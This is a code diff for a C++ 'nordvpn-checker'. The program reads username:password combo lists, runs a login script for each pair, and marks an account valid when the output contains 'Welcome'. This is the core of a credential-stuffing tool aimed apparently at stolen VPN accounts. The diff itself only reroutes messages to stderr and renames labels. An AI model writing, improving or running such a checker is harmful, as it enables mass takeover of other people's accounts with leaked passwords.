@@ -8,8 +8,8 @@
 //#define __DEBUG
 #define TEMPFILE ".tempfile.txt"
 #define SCRIPT "./script.sh"
-#define LIMIT	50
 #define BUFLEN 50
+#define LIMIT 50
 using namespace std;
 
 void parseCombo(const string& combo, string& username, string& password);
@@ -21,33 +21,33 @@ int main(int argc, char* argv[])
     if(argc != 5)
     {
 
-        cout << "[ERROR]: nord-checker: Invalid Number of Arguments\nUsage: " << "./nordchecker -f {input_file_path} -o {output_file_path}\n";
+        cerr << "[ERROR]: nord-checker: Invalid Number of Arguments\nUsage: " << "./nordchecker -f {input_file_path} -o {output_file_path}\n";
         return -1;
     }
 
     if(strcmp(argv[1], "-i") != 0 && strcmp(argv[1], "--input") != 0)
     {
-        cout << "[ERROR]: nord-checker: Invalid Flag: " << argv[1] << '\n';
+        cerr << "[ERROR]: nord-checker: Invalid Flag: " << argv[1] << '\n';
         return -1;
     }
 
     if(strcmp(argv[3], "-o") != 0 && strcmp(argv[3], "--output") != 0)
     {
-        cout << "[ERROR]: nord-checker: Invalid Flag: " << argv[3] << '\n';
+        cerr << "[ERROR]: nord-checker: Invalid Flag: " << argv[3] << '\n';
         return -1;
     }
 
     ifstream ifile{argv[2]};
     if(ifile.fail() || ifile.bad())
     {
-        cout << "[ERROR]: nord-checker: Failed to Open Input file\n";
+        cerr << "[ERROR]: nord-checker: Failed to Open Input file\n";
         return -1;
     }
 
     ofstream ofile{argv[4], std::fstream::out | std::fstream::app};
     if(ofile.fail() || ofile.bad())
     {
-        cout << "[ERROR]: nord-checker: Failed to Open Output file\n";
+        cerr << "[ERROR]: nord-checker: Failed to Open Output file\n";
     }
 
     string combo, username, password;
@@ -61,7 +61,7 @@ int main(int argc, char* argv[])
         pid_t rpid = fork();
         if(rpid == -1)
         {
-            perror("[ERROR]: nordchecker: fork");
+            perror("[ERROR]: nordvpn-checker: fork");
             return -1;
         }
 
@@ -70,20 +70,20 @@ int main(int argc, char* argv[])
             int ret = execlp(SCRIPT, SCRIPT, username.c_str(), password.c_str(), nullptr);
             if(ret == -1)
             {
-                perror("[ERROR]: nordchecker: execvp");
+                perror("[ERROR]: nordvpn-checker: execlp");
                 return -1;
             }
         }
     
 	#ifdef __DEBUG
-	cout << "CPID Before Wait: " << rpid << '\n';
+	cerr << "[DEBUG]: CPID Before Wait: " << rpid << '\n';
 	#endif
 
-
+	cout << "Checking:\t" << combo << '\n';
         pid_t cpid = wait(nullptr);
 
 	#ifdef __DEBUG
-	cout << "CPID By Wait: " << cpid << '\n';
+	cerr << "[DEBUG]: CPID By Wait: " << cpid << '\n';
 	#endif
 	
         bool status = checkStatus();
@@ -114,15 +114,15 @@ void parseCombo(const string& combo, string& username, string& password)
     username = combo.substr(0, delimPos);
 
     #ifdef __DEBUG
-        cout << "Username: " << username << '\n';
+        cerr << "[DEBUG]: Username: " << username << '\n';
     #endif
 
     password = combo.substr(delimPos+1, string::npos);
 
     #ifdef __DEBUG
-        cout << "Password: " << password << '\n';
-	cout << "Size of Password: " << strlen(password.c_str()) << '\n';
-	cout << "Last Character: " << (int)password[8] << '\n';
+        cerr << "[DEBUG]: Password: " << password << '\n';
+	cerr << "[DEBUG]: Length of Password: " << strlen(password.c_str()) << '\n';
+	cerr << "[DEBUG]: Ascii Value of Last Character in Password: " << (int)password[8] << '\n';
     #endif
 
     return ;
@@ -134,14 +134,14 @@ bool checkStatus(void)
     ifstream tempfile{TEMPFILE};
     if(!tempfile.good())
     {
-	    cout << "[ERROR]: checkStatus: Failed to Open tempfile\n";
+	    cerr << "[ERROR]: checkStatus: Failed to Open tempfile\n";
 	    exit(-1);
     }
     while(!tempfile.eof() && tempfile.good())
     {
         getline(tempfile, line);
 	#ifdef __DEBUG
-		cout << line << '\n';
+		cerr << "[DEBUG]: Content of " << TEMPFILE << " : " << line << '\n';
 	#endif
 
         if(line.find("Welcome") != string::npos)
